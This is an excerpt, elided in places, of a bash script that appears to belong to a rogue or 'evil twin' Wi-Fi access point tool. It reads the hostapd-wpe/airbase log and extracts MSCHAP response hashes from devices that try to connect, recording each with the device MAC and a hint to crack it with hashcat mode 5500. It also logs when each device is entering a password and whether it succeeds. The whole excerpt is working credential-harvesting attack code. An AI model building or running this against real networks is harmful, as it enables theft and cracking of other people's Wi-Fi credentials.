  ...
  if [[ "$CAPTURE_AUTH" == "true" ]] && [[ -f "$AIRBASE_LOG" ]]; then
    ...
    if [[ $CURRENT_LOG_SIZE -gt $LAST_LOG_SIZE ]]; then
      ...
      tail -n "$NEW_LINES" "$AIRBASE_LOG" | while IFS= read -r line; do
        ...
        # hostapd-wpe captures plaintext passwords
        ...
        if echo "$line" | grep -iq "mschap.*response"; then
          HASH=$(echo "$line" | grep -oE '[0-9a-fA-F]{48,}' | head -1)
          if [[ -n "$HASH" ]]; then
            echo "[$TIMESTAMP] 🔐 MSCHAP Response Hash: $HASH" | tee -a "$AUTH_LOG"
            [[ -n "$MAC" ]] && echo "    From device MAC: $MAC" | tee -a "$AUTH_LOG"
            echo "    (Can be cracked with: hashcat -m 5500 hash.txt wordlist.txt)" >> "$AUTH_LOG"
            echo >> "$AUTH_LOG"
            log_info "🔐 Password hash captured from ${MAC:-Unknown} - saved to log"
          fi
        fi
        
        # Client attempting to connect (entering password)
        if echo "$line" | grep -iq "STA.*WPA.*pairwise"; then
          if [[ -n "$MAC" ]]; then
            echo "[$TIMESTAMP] 🔓 Device $MAC is entering password..." | tee -a "$AUTH_LOG"
            log_info "🔓 Device $MAC typing password..."
          fi
        fi
        
        # Authentication success (password was correct or accepted)
        if echo "$line" | grep -iq "AP-STA-CONNECTED\|WPA:.*COMPLETED"; then
          if [[ -n "$MAC" ]]; then
            echo "[$TIMESTAMP] ✅ Device $MAC authenticated successfully" | tee -a "$AUTH_LOG"
            log_info "✅ $MAC connected successfully"
          fi
        fi
        
        # Authentication failed (wrong password or rejected)
        if echo "$line" | grep -iq "authentication.*failed\|disconnect.*reason"; then
          if [[ -n "$MAC" ]]; then
            echo "[$TIMESTAMP] ❌ Device $MAC authentication failed" | tee -a "$AUTH_LOG"
            log_warn "❌ $MAC failed to connect"
          fi
        fi
      done
